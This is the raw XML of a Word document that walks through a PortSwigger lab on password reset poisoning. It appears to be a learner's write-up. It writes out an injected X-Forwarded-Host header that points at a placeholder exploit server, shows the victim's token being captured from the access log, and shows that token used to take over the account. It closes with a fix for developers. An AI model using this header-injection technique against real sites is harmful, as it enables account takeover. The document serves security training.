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5F95F" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>PortSwigger Lab POC - 12-password-reset-poisoning-middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CC909A" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 12 — Password reset poisoning via middleware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A25735" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="43F87D19" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>🎯 Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE3F0B0" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Poison a password reset link by injecting a custom `X-Forwarded-Host` header so the reset token gets sent to your exploit server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79956A26" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="74162851" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111596A7" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="04413573" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>🪜 Steps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AC39C5" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="6E310EDC" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1 — Intercept the password reset request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B13F505" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Go to **Forgot password** → enter any username → intercept the POST request in Burp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77ABBE9E" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="12BCB2B4" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60F45F0B" wp14:editId="19EF010A">
            <wp:extent cx="5303520" cy="31158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6E3E" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0107A086" wp14:editId="1CA5D786">
            <wp:extent cx="5303520" cy="31158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2BF9" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="26CDB538" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CADDCF1" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="7501DAD8" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2 — Poison with X-Forwarded-Host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633593BE" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Send request to **Repeater**. Add the header:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1971C2DB" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4D1570" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>X-Forwarded-Host: exploit-YOUR-ID.exploit-server.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743C4745" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47871D40" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Change the username to `carlos`. Send the request.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2579EB68" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="5148AF60" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The reset email sent to Carlos will contain a link pointing to **your** exploit server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7CD15C" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="0B78AE50" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2149F4EB" wp14:editId="2D45940E">
            <wp:extent cx="5303520" cy="31158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D827" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="074826A4" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FF0637" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="539E655D" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 3 — Capture the reset token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA38483" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Go to **Exploit Server → Access log**.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621F8CB9" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="6F668E37" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Find the GET request — it contains Carlos's real reset token:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6ABB3B" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359DABF6" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>GET /forgot-password?temp-forgot-password-token=CAPTURED-TOKEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CDADAEC" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730D98C7" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="6BAAECAC" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="614DB384" wp14:editId="7CECA9A7">
            <wp:extent cx="5303520" cy="31158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6F5C" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="042ACD0E" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79094123" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="7314DE9D" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 4 — Use the token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AD1377" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Take the real reset URL and replace its token with the captured token.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D07B65" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="0D1AB042" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E3553F8" wp14:editId="7EE324EF">
            <wp:extent cx="5303520" cy="31158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80EF" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="19A72A11" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D058E77" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="19373F3A" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 5 — Set a new password and login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77815F4C" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Open the modified link → set a new password → login as Carlos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3931CE89" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="46CD3536" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B0CEED7" wp14:editId="6A339E6C">
            <wp:extent cx="5303520" cy="31158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317B" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="595179DD" wp14:editId="25BCEAF4">
            <wp:extent cx="5303520" cy="311581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25DC" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="47AB2B29" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA38D41" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="796EA36B" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2480318A" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Lab solved!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F943BD" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="49A883E0" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D7F686" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00EB1200"/>
    <w:p w14:paraId="58195DD3" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>💡 Key Takeaway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60315E1D" w14:textId="77777777" w:rsidR="00EB1200" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Never use `X-Forwarded-Host` to build password reset links. Always construct URLs from the server's own configured domain.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00EB12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8547890">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="906037256">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1090663646">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1786388223">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1194346481">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1034579755">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1954049859">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="196050028">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1086415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0AA"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="004015F9"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00EB12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C16032"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{0B421CCA-9AFA-454D-B1B3-F457A9FFB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singh rajput</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-24T14:09:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>